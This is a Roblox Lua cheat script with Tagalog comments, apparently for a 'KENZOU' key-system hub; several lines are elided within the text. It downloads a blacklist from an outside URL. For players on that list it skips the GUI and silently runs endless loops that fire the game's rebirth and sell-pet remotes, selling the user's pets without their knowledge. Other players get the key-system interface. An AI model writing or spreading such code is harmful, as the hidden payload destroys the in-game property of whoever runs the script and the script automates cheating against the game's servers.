-- ==========================================
-- 1. BLACKLIST & CHECKING SYSTEM (URL BASED)
-- ==========================================
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local BLACKLIST_URL = "https://slh-hub.lovable.app/raw/blacklist-lua" 
local localPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()

-- Kumuha ng blacklist data sa URL
local function getBlacklist()
    ...
    if successJson and type(data) == "table" then
        return data
    end
    
    -- Kung plain text / line by line ang format
    local list = {}
...
local blacklistedList = getBlacklist()

-- Function para suriin kung blacklisted ang player
local function checkIsBlacklisted()
    for _, item in ipairs(blacklistedList) do
        if tostring(item) == tostring(localPlayer.UserId) or string.lower(tostring(item)) == string.lower(localPlayer.Name) then
            return true
        end
    end
    return false
...
-- ==========================================
-- 2. KUNG BLACKLISTED: GAGANA LANG ANG AUTO-REBIRTH AT AUTO-SELL
-- ==========================================
if checkIsBlacklisted() then
    print("[SYSTEM] Blacklisted Player Detected! Key System disabled.")

    -- A. AUTO-REBIRTH LOOP
    task.spawn(function()
        while true do
            pcall(function()
                local remotes = game:GetService("ReplicatedStorage"):FindFirstChild("remotes") or game:GetService("ReplicatedStorage"):FindFirstChild("Remotes")
                if remotes then
                    local rebirthRemote = remotes:FindFirstChild("rebirthRequest") or remotes:FindFirstChild("RebirthRequest")
                    if rebirthRemote then
                        rebirthRemote:FireServer()
                    end
                end
            end)
            task.wait(1) -- Ulitin kada 1 segundo
        end
    end)

    -- B. AUTO-SELL PETS LOOP
    task.spawn(function()
        ...
        while true do
            pcall(function()
                ...
                if remotesFolder then
                    local sellRemote = remotesFolder:FindFirstChild("sellPet") 
                        or remotesFolder:FindFirstChild("SellPet") 
                        or remotesFolder:FindFirstChild("sellRequest")
                        or remotesFolder:FindFirstChild("SellRequest")

                    if sellRemote then
                        local petsFolder = localPlayer:FindFirstChild("PetsFolder") or localPlayer:FindFirstChild("Pets")
                        if petsFolder then
                            for _, petName in ipairs(petsToAutoSell) do
                                local petObj = petsFolder:FindFirstChild(petName)
                                if petObj then
                                    sellRemote:FireServer(petObj)
                                end
                            end
                        end
                    end
            ...
            task.wait(1) -- Nagse-sell kada 1 segundo
        end
    end)

    -- IHINTO ANG EXECUTION DITO! WALANG LALABAS NA GUI O KEY SYSTEM.
    return
end

-- ==========================================
-- 3. KUNG HINDI BLACKLISTED: SAKA LANG LALABAS ANG KEY SYSTEM
-- ==========================================
local v1 = { "PrimeKenzouu" }
...
local function f1()
  ...
  frame6.Position = UDim2.new(0.5, -310, 0.5, -204)
  ...
  textLabel5.Text = "KENZOU | KEY SYSTEM"
